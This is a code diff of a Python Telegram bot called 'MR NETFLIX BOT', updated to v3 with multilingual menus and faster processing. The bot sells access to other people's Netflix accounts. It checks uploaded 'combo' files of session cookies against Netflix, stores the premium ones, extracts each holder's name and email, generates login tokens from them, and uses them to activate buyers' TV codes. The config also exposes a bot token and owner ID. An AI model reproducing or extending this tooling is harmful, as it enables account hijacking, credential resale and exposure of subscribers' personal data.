@@ -1,5 +1,5 @@
 # ============================================================
-# MR NETFLIX BOT v2 — Paid + Points + Referral
+# MR NETFLIX BOT v3 — Languages + Locks + Fast Combo
 # ============================================================
 
 import sys
@@ -50,35 +50,29 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 # ============================================================
 # CONFIG — غيّر هنا
 # ============================================================
-BOT_TOKEN = "9021933468:AAEHgQARV9BXglnxYnk1_o_kmxtTvQebD74"       # ← @BotFather
-OWNER_ID = 8409645947                        # ← تأكد
-CHANNEL_ID = "@mar_netflix"                  # ← قناة الإشعارات
-TECH_USERNAME = "@BR_Go_16"                  # ← الفني (للتواصل)
+BOT_TOKEN = "9021933468:AAEHgQARV9BXglnxYnk1_o_kmxtTvQebD74"
+OWNER_ID = 8409645947
+CHANNEL_ID = "@mar_netflix"
+TECH_USERNAME = "@BR_Go_16"
 STORE_NAME = "MR NETFLIX"
 SUPPORT_USERNAME = "@BR_Go_16"
 
-# أسعار
-DEFAULT_ACCOUNT_PRICE = 100                  # نقاط
-DEFAULT_MARKET_PRICE = 500                   # د.ج
-TOPUP_STARS = 15                             # نجمة
-TOPUP_POINTS = 15                            # نقاط
-REFERRAL_POINTS = 1                          # نقطة لكل إحالة
+DEFAULT_ACCOUNT_PRICE = 100
+DEFAULT_MARKET_PRICE = 500
+TOPUP_STARS = 15
+TOPUP_POINTS = 15
+REFERRAL_POINTS = 1
 
-# ============================================================
-# FILES
-# ============================================================
 COOKIES_DIR = "vault"
 USERS_FILE = "users.json"
 TOPOPS_FILE = "pending_topups.json"
 DYN_ADMINS_FILE = "dyn_admins.json"
 CONFIG_FILE = "config.json"
-SALES_DIR = "sales"
 
 os.makedirs(COOKIES_DIR, exist_ok=True)
-os.makedirs(SALES_DIR, exist_ok=True)
 
-MAX_WORKERS = 20
-BATCH_SIZE = 10
+MAX_WORKERS = 30
+BATCH_SIZE = 15
 REQUEST_TIMEOUT = 20
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
@@ -87,29 +81,17 @@ OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
 ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
 CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}
 
-# ============================================================
-# NFTOKEN (من الكود الأصلي)
-# ============================================================
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_QUERY_PARAMS = {
     "appVersion": "15.48.1",
     "config": '{"kidsBillboardEnabled":"true","billboardEnabled":"true"}',
     "device_type": "NFAPPL-02-",
     "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-    "idiom": "phone",
-    "iosVersion": "15.8.5",
-    "isTablet": "false",
-    "languages": "en-US",
-    "locale": "en-US",
-    "maxDeviceWidth": "375",
-    "model": "saget",
-    "modelType": "IPHONE8-1",
-    "odpAware": "true",
-    "path": '["account","token","default"]',
-    "pathFormat": "graph",
-    "pixelDensity": "2.0",
-    "progressive": "false",
-    "responseFormat": "json",
+    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
+    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
+    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
+    "path": '["account","token","default"]', "pathFormat": "graph",
+    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
 }
 
 NFTOKEN_HEADERS = {
@@ -120,9 +102,6 @@ NFTOKEN_HEADERS = {
     "accept-language": "en-US;q=1",
 }
 
-# ============================================================
-# LOCKS
-# ============================================================
 cookie_lock = threading.Lock()
 users_lock = threading.Lock()
 topups_lock = threading.Lock()
@@ -141,9 +120,177 @@ log = logging.getLogger(__name__)
 
 user_state = {}
 user_executors = {}
+user_locks = defaultdict(asyncio.Lock)
 
 # ============================================================
-# LOAD/SAVE — JSON helpers
+# LANGUAGES
+# ============================================================
+LANGS = {
+    "ar": {"flag": "🇸🇦", "name": "العربية"},
+    "en": {"flag": "🇫🇴", "name": "English"},
+    "fr": {"flag": "🇫🇷", "name": "Français"},
+}
+
+TEXTS = {
+    "ar": {
+        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 مرحبا <b>{name}</b>!\n💰 رصيدك: <b>{points}</b> نقطة\n🏷️ سعر الحساب: <b>{price}</b> نقطة (~{market} د.ج)\n\nاختر من الأزرار:",
+        "choose_lang": "🌐 <b>اختر لغتك</b>\n\nPlease choose your language\nVeuillez choisir votre langue",
+        "buy": "🛒 شراء حساب", "topup": "💰 شحن", "ref": "🎁 الإحالة",
+        "purchases": "📦 مشترياتي", "account": "👤 حسابي", "support": "📞 الدعم",
+        "admin": "👑 الأدمن", "back": "🔙 رجوع",
+        "phone": "📱 هاتف", "tv": "📺 TV",
+        "check": "🔍 فحص كومبو", "clear": "🗑️ حذف كوكيزات",
+        "price": "💵 السعر", "market": "💰 سوق",
+        "addp": "➕ إضافة نقاط", "remp": "➖ خصم نقاط",
+        "promote": "👥 رفع أدمن", "demote": "📉 تنزيل أدمن",
+        "topups": "💳 طلبات شحن", "stats": "📊 إحصائيات",
+        "lang": "🌐 اللغة",
+        "insufficient": "❌ <b>نقاطك غير كافية</b>\n\n💰 رصيدك: <b>{points}</b>\n🏷️ السعر: <b>{price}</b>\n📉 تحتاج: <b>{need}</b>",
+        "vault_empty": "❌ <b>الخزنة فارغة</b>\n\nلا توجد حسابات متاحة.",
+        "buy_choose": "🛒 <b>شراء حساب</b>\n\n💰 السعر: <b>{price}</b> نقطة\n🎯 رصيدك: <b>{points}</b>\n📦 المتاح: <b>{vault}</b>\n\nاختر نوع التفعيل:",
+        "tv_input": "📺 <b>تفعيل TV</b>\n\nأرسل كود الشاشة (8 أرقام):",
+        "topup_info": "💰 <b>شحن الرصيد</b>\n\n⭐ المطلوب: <b>{stars} نجمة</b>\n➕ تحصل على: <b>{points} نقطة</b>\n\n📞 تواصل مع: {tech}",
+        "topup_sent": "✅ <b>تم إرسال طلب الشحن</b>\n\n⏳ في انتظار الموافقة.",
+        "pending_topup": "⏳ <b>عندك طلب شحن قيد المراجعة</b>\n\n📞 {tech}",
+        "ref_info": "🎁 <b>رابط الإحالة</b>\n\n<code>{link}</code>\n\n💰 كل صديق = <b>+{points} نقطة</b>",
+        "no_purchases": "📦 <b>مشترياتي</b>\n\nلا توجد مشتريات.",
+        "purchases_list": "📦 <b>مشترياتي ({count})</b>\n\n{items}\n\n💰 رصيدك: <b>{balance}</b>",
+        "acc_info": "👤 <b>حسابي</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>النقاط:</b> {points}\n🎁 <b>الإحالات:</b> {refs}\n📦 <b>المشتريات:</b> {purchases}\n📅 <b>الانضمام:</b> {joined}",
+        "check_prompt": "🔍 <b>فحص كومبو</b>\n\n📤 ارفع ملف .txt / .json / .zip\n⚙️ فحص بريميوم فقط وحفظهم.",
+        "price_prompt": "💵 <b>تغيير السعر</b>\n\nالحالي: <b>{current}</b> نقطة\n\nأرسل السعر الجديد:",
+        "market_prompt": "💰 <b>سعر السوق</b>\n\nالحالي: <b>{current}</b> د.ج\n\nأرسل السعر الجديد:",
+        "addp_prompt": "➕ <b>إضافة نقاط</b>\n\nأرسل: <code>user_id نقاط</code>\nمثال: <code>123456789 15</code>",
+        "remp_prompt": "➖ <b>خصم نقاط</b>\n\nأرسل: <code>user_id نقاط</code>\nمثال: <code>123456789 10</code>",
+        "promote_prompt": "👥 <b>رفع أدمن</b>\n\nأرسل ID المستخدم:",
+        "demote_prompt": "📉 <b>تنزيل أدمن</b>\n\nأرسل ID المستخدم:",
+        "no_topups": "💳 <b>طلبات الشحن</b>\n\nلا توجد طلبات.",
+        "admin_title": "👑 <b>لوحة الأدمن</b>\n\n💰 السعر: <b>{price}</b> نقطة\n💵 السوق: <b>{market}</b> د.ج\n📦 الخزنة: <b>{vault}</b>\n💳 طلبات: <b>{topups}</b>",
+        "buy_success": "✅ <b>تم الشراء!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 رصيدك: <b>{balance}</b>\n\n📱 <b>هاتف:</b>\n<code>{phone_url}</code>\n\n💻 <b>كمبيوتر:</b>\n<code>{pc_url}</code>",
+        "tv_success": "✅ <b>تم التفعيل!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 رصيدك: <b>{balance}</b>",
+        "tv_failed": "❌ <b>فشل التفعيل</b>\n\n⚠️ {error}\n\nلم يتم خصم نقاط.",
+        "processing": "⏳ جاري المعالجة...",
+        "stop": "🛑 إيقاف",
+        "invalid_number": "❌ رقم غير صالح",
+        "invalid_format": "❌ صيغة خاطئة",
+        "lang_changed": "✅ تم تغيير اللغة",
+        "already_pending": "⚠️ موجود مسبقاً",
+        "not_admin": "⚠️ مو أدمن",
+        "promoted": "✅ تم رفع الأدمن: {uid}",
+        "demoted": "✅ تم تنزيل الأدمن: {uid}",
+        "added_points": "✅ +{amount} نقطة لـ {uid}\n💰 الرصيد: {balance}",
+        "removed_points": "✅ -{amount} نقطة من {uid}\n💰 الرصيد: {balance}",
+    },
+    "en": {
+        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 Hello <b>{name}</b>!\n💰 Balance: <b>{points}</b> points\n🏷️ Account price: <b>{price}</b> points (~{market} DZD)\n\nChoose:",
+        "choose_lang": "🌐 <b>Choose your language</b>\n\nPlease choose your language",
+        "buy": "🛒 Buy", "topup": "💰 Top Up", "ref": "🎁 Referral",
+        "purchases": "📦 My Purchases", "account": "👤 Account", "support": "📞 Support",
+        "admin": "👑 Admin", "back": "🔙 Back",
+        "phone": "📱 Phone", "tv": "📺 TV",
+        "check": "🔍 Check Combo", "clear": "🗑️ Clear Vault",
+        "price": "💵 Price", "market": "💰 Market",
+        "addp": "➕ Add Points", "remp": "➖ Remove Points",
+        "promote": "👥 Promote", "demote": "📉 Demote",
+        "topups": "💳 Top-Ups", "stats": "📊 Stats",
+        "lang": "🌐 Language",
+        "insufficient": "❌ <b>Insufficient Points</b>\n\n💰 Balance: <b>{points}</b>\n🏷️ Price: <b>{price}</b>\n📉 Need: <b>{need}</b>",
+        "vault_empty": "❌ <b>Vault is Empty</b>\n\nNo accounts available.",
+        "buy_choose": "🛒 <b>Buy Account</b>\n\n💰 Price: <b>{price}</b> points\n🎯 Balance: <b>{points}</b>\n📦 Available: <b>{vault}</b>\n\nChoose activation:",
+        "tv_input": "📺 <b>TV Activation</b>\n\nSend 8-digit code from TV:",
+        "topup_info": "💰 <b>Top Up</b>\n\n⭐ Required: <b>{stars} Stars</b>\n➕ Get: <b>{points} points</b>\n\n📞 Contact: {tech}",
+        "topup_sent": "✅ <b>Top-Up Request Sent</b>\n\n⏳ Awaiting approval.",
+        "pending_topup": "⏳ <b>Pending Top-Up</b>\n\n📞 {tech}",
+        "ref_info": "🎁 <b>Referral Link</b>\n\n<code>{link}</code>\n\n💰 Each friend = <b>+{points} points</b>",
+        "no_purchases": "📦 <b>My Purchases</b>\n\nNo purchases yet.",
+        "purchases_list": "📦 <b>My Purchases ({count})</b>\n\n{items}\n\n💰 Balance: <b>{balance}</b>",
+        "acc_info": "👤 <b>My Account</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>Points:</b> {points}\n🎁 <b>Referrals:</b> {refs}\n📦 <b>Purchases:</b> {purchases}\n📅 <b>Joined:</b> {joined}",
+        "check_prompt": "🔍 <b>Check Combo</b>\n\n📤 Upload .txt / .json / .zip\n⚙️ Premium only, saved to vault.",
+        "price_prompt": "💵 <b>Set Price</b>\n\nCurrent: <b>{current}</b> points\n\nSend new price:",
+        "market_prompt": "💰 <b>Market Price</b>\n\nCurrent: <b>{current}</b> DZD\n\nSend new price:",
+        "addp_prompt": "➕ <b>Add Points</b>\n\nSend: <code>user_id points</code>\nExample: <code>123456789 15</code>",
+        "remp_prompt": "➖ <b>Remove Points</b>\n\nSend: <code>user_id points</code>\nExample: <code>123456789 10</code>",
+        "promote_prompt": "👥 <b>Promote Admin</b>\n\nSend user ID:",
+        "demote_prompt": "📉 <b>Demote Admin</b>\n\nSend user ID:",
+        "no_topups": "💳 <b>Top-Up Requests</b>\n\nNo requests.",
+        "admin_title": "👑 <b>Admin Panel</b>\n\n💰 Price: <b>{price}</b> points\n💵 Market: <b>{market}</b> DZD\n📦 Vault: <b>{vault}</b>\n💳 Requests: <b>{topups}</b>",
+        "buy_success": "✅ <b>Purchase Complete!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 Balance: <b>{balance}</b>\n\n📱 <b>Phone:</b>\n<code>{phone_url}</code>\n\n💻 <b>PC:</b>\n<code>{pc_url}</code>",
+        "tv_success": "✅ <b>Activated!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 Balance: <b>{balance}</b>",
+        "tv_failed": "❌ <b>Activation Failed</b>\n\n⚠️ {error}\n\nNo points deducted.",
+        "processing": "⏳ Processing...",
+        "stop": "🛑 Stop",
+        "invalid_number": "❌ Invalid number",
+        "invalid_format": "❌ Invalid format",
+        "lang_changed": "✅ Language changed",
+        "already_pending": "⚠️ Already exists",
+        "not_admin": "⚠️ Not admin",
+        "promoted": "✅ Admin promoted: {uid}",
+        "demoted": "✅ Admin demoted: {uid}",
+        "added_points": "✅ +{amount} points to {uid}\n💰 Balance: {balance}",
+        "removed_points": "✅ -{amount} points from {uid}\n💰 Balance: {balance}",
+    },
+    "fr": {
+        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 Bonjour <b>{name}</b>!\n💰 Solde: <b>{points}</b> points\n🏷️ Prix: <b>{price}</b> points (~{market} DZD)\n\nChoisissez:",
+        "choose_lang": "🌐 <b>Choisissez votre langue</b>\n\nVeuillez choisir votre langue",
+        "buy": "🛒 Acheter", "topup": "💰 Recharger", "ref": "🎁 Parrainage",
+        "purchases": "📦 Mes Achats", "account": "👤 Compte", "support": "📞 Support",
+        "admin": "👑 Admin", "back": "🔙 Retour",
+        "phone": "📱 Téléphone", "tv": "📺 TV",
+        "check": "🔍 Vérifier Combo", "clear": "🗑️ Vider Coffre",
+        "price": "💵 Prix", "market": "💰 Marché",
+        "addp": "➕ Ajouter Points", "remp": "➖ Retirer Points",
+        "promote": "👥 Promouvoir", "demote": "📉 Rétrograder",
+        "topups": "💳 Recharges", "stats": "📊 Stats",
+        "lang": "🌐 Langue",
+        "insufficient": "❌ <b>Points Insuffisants</b>\n\n💰 Solde: <b>{points}</b>\n🏷️ Prix: <b>{price}</b>\n📉 Besoin: <b>{need}</b>",
+        "vault_empty": "❌ <b>Coffre Vide</b>\n\nAucun compte disponible.",
+        "buy_choose": "🛒 <b>Acheter Compte</b>\n\n💰 Prix: <b>{price}</b> points\n🎯 Solde: <b>{points}</b>\n📦 Disponible: <b>{vault}</b>\n\nChoisir activation:",
+        "tv_input": "📺 <b>Activation TV</b>\n\nEnvoyez le code à 8 chiffres:",
+        "topup_info": "💰 <b>Recharger</b>\n\n⭐ Requis: <b>{stars} Étoiles</b>\n➕ Reçu: <b>{points} points</b>\n\n📞 Contact: {tech}",
+        "topup_sent": "✅ <b>Demande Envoyée</b>\n\n⏳ En attente d'approbation.",
+        "pending_topup": "⏳ <b>Recharge en attente</b>\n\n📞 {tech}",
+        "ref_info": "🎁 <b>Lien de Parrainage</b>\n\n<code>{link}</code>\n\n💰 Chaque ami = <b>+{points} points</b>",
+        "no_purchases": "📦 <b>Mes Achats</b>\n\nAucun achat.",
+        "purchases_list": "📦 <b>Mes Achats ({count})</b>\n\n{items}\n\n💰 Solde: <b>{balance}</b>",
+        "acc_info": "👤 <b>Mon Compte</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>Points:</b> {points}\n🎁 <b>Parrainages:</b> {refs}\n📦 <b>Achats:</b> {purchases}\n📅 <b>Inscrit:</b> {joined}",
+        "check_prompt": "🔍 <b>Vérifier Combo</b>\n\n📤 Uploadez .txt / .json / .zip\n⚙️ Premium seulement, sauvegardé.",
+        "price_prompt": "💵 <b>Définir Prix</b>\n\nActuel: <b>{current}</b> points\n\nEnvoyez le nouveau prix:",
+        "market_prompt": "💰 <b>Prix du Marché</b>\n\nActuel: <b>{current}</b> DZD\n\nEnvoyez le nouveau prix:",
+        "addp_prompt": "➕ <b>Ajouter Points</b>\n\nEnvoyez: <code>user_id points</code>\nExemple: <code>123456789 15</code>",
+        "remp_prompt": "➖ <b>Retirer Points</b>\n\nEnvoyez: <code>user_id points</code>\nExemple: <code>123456789 10</code>",
+        "promote_prompt": "👥 <b>Promouvoir Admin</b>\n\nEnvoyez l'ID:",
+        "demote_prompt": "📉 <b>Rétrograder Admin</b>\n\nEnvoyez l'ID:",
+        "no_topups": "💳 <b>Demandes de Recharge</b>\n\nAucune demande.",
+        "admin_title": "👑 <b>Panneau Admin</b>\n\n💰 Prix: <b>{price}</b> points\n💵 Marché: <b>{market}</b> DZD\n📦 Coffre: <b>{vault}</b>\n💳 Demandes: <b>{topups}</b>",
+        "buy_success": "✅ <b>Achat Réussi!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 Solde: <b>{balance}</b>\n\n📱 <b>Téléphone:</b>\n<code>{phone_url}</code>\n\n💻 <b>PC:</b>\n<code>{pc_url}</code>",
+        "tv_success": "✅ <b>Activé!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 Solde: <b>{balance}</b>",
+        "tv_failed": "❌ <b>Échec Activation</b>\n\n⚠️ {error}\n\nAucun point déduit.",
+        "processing": "⏳ Traitement...",
+        "stop": "🛑 Arrêter",
+        "invalid_number": "❌ Numéro invalide",
+        "invalid_format": "❌ Format invalide",
+        "lang_changed": "✅ Langue changée",
+        "already_pending": "⚠️ Existe déjà",
+        "not_admin": "⚠️ Pas admin",
+        "promoted": "✅ Admin promu: {uid}",
+        "demoted": "✅ Admin rétrogradé: {uid}",
+        "added_points": "✅ +{amount} points à {uid}\n💰 Solde: {balance}",
+        "removed_points": "✅ -{amount} points de {uid}\n💰 Solde: {balance}",
+    },
+}
+
+
+def t(uid, key, **kwargs):
+    user = get_user(uid)
+    lang = user.get("lang", "ar")
+    template = TEXTS.get(lang, TEXTS["ar"]).get(key, key)
+    try:
+        return template.format(**kwargs) if kwargs else template
+    except Exception:
+        return template
+
+
+# ============================================================
+# JSON HELPERS
 # ============================================================
 def _load_json(path, default):
     if not os.path.exists(path):
@@ -177,10 +324,8 @@ def get_user(uid):
     users = load_users()
     if uid not in users:
         users[uid] = {
-            "points": 0,
-            "referrer": None,
-            "purchases": [],
-            "username": None,
+            "points": 0, "referrer": None, "purchases": [],
+            "username": None, "lang": None,
             "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         }
         save_users(users)
@@ -200,7 +345,7 @@ def add_points(uid, amount):
     if uid not in users:
         users[uid] = {
             "points": 0, "referrer": None, "purchases": [],
-            "username": None,
+            "username": None, "lang": None,
             "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         }
     users[uid]["points"] = users[uid].get("points", 0) + amount
@@ -223,7 +368,7 @@ def get_user_points(uid):
 
 
 # ============================================================
-# CONFIG (السعر)
+# CONFIG
 # ============================================================
 def load_config():
     with _config_lock:
@@ -285,37 +430,35 @@ def is_admin(uid):
 
 
 # ============================================================
-# PENDING TOPUPS
+# TOPUPS
 # ============================================================
 def load_topups():
     return _load_json(TOPOPS_FILE, {})
 
 
-def save_topups(t):
+def save_topups(t_):
     with topups_lock:
-        _save_json(TOPOPS_FILE, t)
+        _save_json(TOPOPS_FILE, t_)
 
 
 def has_pending_topup(uid):
-    t = load_topups()
-    return str(uid) in t
+    return str(uid) in load_topups()
 
 
 def create_topup(uid, username=None):
-    t = load_topups()
-    t[str(uid)] = {
-        "user_id": uid,
-        "username": username,
+    tp = load_topups()
+    tp[str(uid)] = {
+        "user_id": uid, "username": username,
         "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "status": "pending",
     }
-    save_topups(t)
+    save_topups(tp)
 
 
 def approve_topup(uid, points):
-    t = load_topups()
-    entry = t.pop(str(uid), None)
-    save_topups(t)
+    tp = load_topups()
+    entry = tp.pop(str(uid), None)
+    save_topups(tp)
     if entry:
         add_points(uid, points)
         return True
@@ -323,9 +466,9 @@ def approve_topup(uid, points):
 
 
 def reject_topup(uid):
-    t = load_topups()
-    entry = t.pop(str(uid), None)
-    save_topups(t)
+    tp = load_topups()
+    entry = tp.pop(str(uid), None)
+    save_topups(tp)
     return bool(entry)
 
 
@@ -343,8 +486,7 @@ def clean_unicode(val):
     try: val = html_mod.unescape(val)
     except Exception: pass
     val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
-    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
-    return val
+    return ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
 
 
 def safe_html(text):
@@ -353,10 +495,10 @@ def safe_html(text):
     return text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
 
 
-def dict_to_netscape(cookie_dict, domain=".netflix.com"):
+def dict_to_netscape(cd, domain=".netflix.com"):
     expiry = int(time.time()) + 180 * 24 * 3600
     lines = ["# Netscape HTTP Cookie File"]
-    for k, v in cookie_dict.items():
+    for k, v in cd.items():
         lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
     return "\n".join(lines)
 
@@ -505,7 +647,7 @@ def check_netflix_cookie(cookie_dict):
         resp = None; txt = ""
         for url in urls:
             try:
-                r = session.get(url, headers=headers, timeout=15, allow_redirects=True)
+                r = session.get(url, headers=headers, timeout=12, allow_redirects=True)
                 if r.status_code == 200 and 'Account' in r.text:
                     resp = r; txt = r.text; break
             except Exception:
@@ -530,14 +672,10 @@ def check_netflix_cookie(cookie_dict):
         if not has_data:
             return {'ok': False, 'reason': 'no data', 'cookie': cookie_dict}
         return {
-            'ok': True,
-            'premium': ms == 'CURRENT_MEMBER',
-            'name': name or 'Unknown',
-            'email': email or 'Unknown',
-            'country': country or 'Unknown',
-            'plan': plan or 'Unknown',
-            'membership_status': ms or 'Unknown',
-            'cookie': cookie_dict
+            'ok': True, 'premium': ms == 'CURRENT_MEMBER',
+            'name': name or 'Unknown', 'email': email or 'Unknown',
+            'country': country or 'Unknown', 'plan': plan or 'Unknown',
+            'membership_status': ms or 'Unknown', 'cookie': cookie_dict
         }
     except Exception as e:
         return {'ok': False, 'reason': str(e)[:30], 'cookie': cookie_dict}
@@ -554,8 +692,7 @@ def generate_nftoken(cookie_dict):
         r.raise_for_status()
         data = r.json()
         td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
-        token = td.get("token")
-        expires = td.get("expires")
+        token = td.get("token"); expires = td.get("expires")
         if not token: return None, "Dead cookie"
         if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
         expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
@@ -564,9 +701,6 @@ def generate_nftoken(cookie_dict):
         return None, str(e)[:30]
 
 
-# ============================================================
-# VAULT
-# ============================================================
 def get_vault_cookies():
     if not os.path.exists(COOKIES_DIR): return []
     return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]
@@ -609,14 +743,13 @@ def get_random_cookie_file():
 # ============================================================
 # TV LOGIN
 # ============================================================
-def validate_cookie_tv(cookies, proxy=None):
+def validate_cookie_tv(cookies):
     session = requests.Session()
     session.cookies.update(cookies)
-    headers = {"User-Agent": USER_AGENT, "Accept": "text/html",
-               "Accept-Language": "en-US,en;q=0.9"}
+    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
     try:
         r = session.get("https://www.netflix.com/YourAccount", headers=headers,
-                        proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
+                        timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
         if 'login' in r.url.lower() or 'signin' in r.url.lower(): return False, None, None
         if r.status_code != 200: return False, None, None
         country = None; plan = "Unknown"
@@ -641,27 +774,24 @@ def extract_auth_url(html_text):
     return m.group(0) if m else None
 
 
-def submit_tv_code(session, tv_code, proxy=None):
+def submit_tv_code(session, tv_code):
     url = "https://www.netflix.com/tv8"
-    headers = {"User-Agent": USER_AGENT, "Accept": "text/html",
-               "Accept-Language": "en-US,en;q=0.9"}
+    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
     try:
-        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
+        r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
         if r.status_code != 200: return {"success": False, "error": "TV page down"}
     except Exception as e:
         return {"success": False, "error": str(e)[:40]}
     auth_url = extract_auth_url(r.text)
     if not auth_url: return {"success": False, "error": "no auth url"}
     post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded",
-                    "Referer": "https://www.netflix.com/tv8",
-                    "Origin": "https://www.netflix.com"}
+                    "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
     form = {"flow": "websiteSignUp", "authURL": auth_url,
             "flowMode": "enterTvLoginRendezvousCode",
             "withFields": "tvLoginRendezvousCode,isTvUrl2",
-            "code": tv_code, "tvLoginRendezvousCode": tv_code,
-            "action": "nextAction"}
+            "code": tv_code, "tvLoginRendezvousCode": tv_code, "action": "nextAction"}
     try:
-        r = session.post(url, data=form, headers=post_headers, proxies=proxy,
+        r = session.post(url, data=form, headers=post_headers,
                          timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
     except Exception as e:
         return {"success": False, "error": str(e)[:40]}
@@ -669,23 +799,18 @@ def submit_tv_code(session, tv_code, proxy=None):
     text = str.lower(re.sub(r'\s+', ' ', html_mod.unescape(re.sub(r'<[^>]+>', ' ', r.text))))
     for p in [r"your tv is ready", r"successfully activated"]:
         if re.search(p, text): return {"success": True, "error": None}
-    for p in [r"that code wasn'?t right",
-              r"code (is )?(incorrect|invalid|wrong|expired)"]:
+    for p in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)"]:
         if re.search(p, text): return {"success": False, "error": "Invalid code"}
     return {"success": False, "error": "unknown"}
 
 
 def process_tv_login(tv_code):
-    """يحاول تفعيل TV — يرجع dict {success, country, plan, error, attempts}"""
     max_attempts = min(100, max(count_vault_cookies() * 2, 30))
-    attempts = 0
     tried = []
-    while attempts < max_attempts:
-        attempts += 1
+    for _ in range(max_attempts):
         filename, content = get_random_cookie_file()
         if not filename:
-            return {"success": False, "error": "no_cookies_left",
-                    "tried_countries": tried}
+            return {"success": False, "error": "no_cookies_left", "tried_countries": tried}
         cookies = extract_cookie_dict_tv(content)
         if not cookies or not cookies.get('NetflixId'):
             continue
@@ -696,601 +821,18 @@ def process_tv_login(tv_code):
         session = requests.Session()
         session.cookies.update(cookies)
         result = submit_tv_code(session, tv_code)
-        result["country"] = country
-        result["plan"] = plan
+        result["country"] = country; result["plan"] = plan
         result["tried_countries"] = tried
-        if result["success"]:
-            return result
-        if "Invalid" in str(result.get("error", "")):
-            return result
+        if result["success"]: return result
+        if "Invalid" in str(result.get("error", "")): return result
     return {"success": False, "error": "all_failed", "tried_countries": tried}
 
 
-# ============================================================
-# NOTIFICATIONS
-# ============================================================
-async def notify_channel(context, text):
-    try:
-        await context.bot.send_message(
-            chat_id=CHANNEL_ID, text=text, parse_mode="HTML"
-        )
-    except Exception as e:
-        log.warning("channel notify failed: %s", e)
-
-
-# ============================================================
-# MARKUPS
-# ============================================================
-def get_main_markup(uid):
-    rows = [
-        [InlineKeyboardButton("🛒 شراء حساب", callback_data="buy")],
-        [InlineKeyboardButton("💰 شحن رصيد", callback_data="topup")],
-        [InlineKeyboardButton("🎁 رابط الإحالة", callback_data="ref_link")],
-        [InlineKeyboardButton("📦 مشترياتي", callback_data="my_purchases")],
-        [InlineKeyboardButton("👤 حسابي", callback_data="my_account")],
-        [InlineKeyboardButton("📞 الدعم", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
-    ]
-    if is_admin(uid):
-        rows.append([InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel")])
-    return InlineKeyboardMarkup(rows)
-
-
-def buy_type_markup():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📱 تفعيل هاتف (روابط)", callback_data="buy_phone")],
-        [InlineKeyboardButton("📺 تفعيل شاشة TV (كود)", callback_data="buy_tv")],
-        [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
-    ])
-
-
-def admin_markup():
-    rows = [
-        [InlineKeyboardButton("🔍 فحص كومبو", callback_data="admin_check")],
-        [InlineKeyboardButton("🗑️ حذف كوكيزات", callback_data="admin_clear")],
-        [InlineKeyboardButton("💵 تغيير السعر (نقاط)", callback_data="admin_set_price")],
-        [InlineKeyboardButton("💰 تغيير سعر السوق", callback_data="admin_set_market")],
-        [InlineKeyboardButton("➕ إضافة نقاط", callback_data="admin_add_points")],
-        [InlineKeyboardButton("➖ خصم نقاط", callback_data="admin_remove_points")],
-        [InlineKeyboardButton("👥 رفع أدمن", callback_data="admin_promote")],
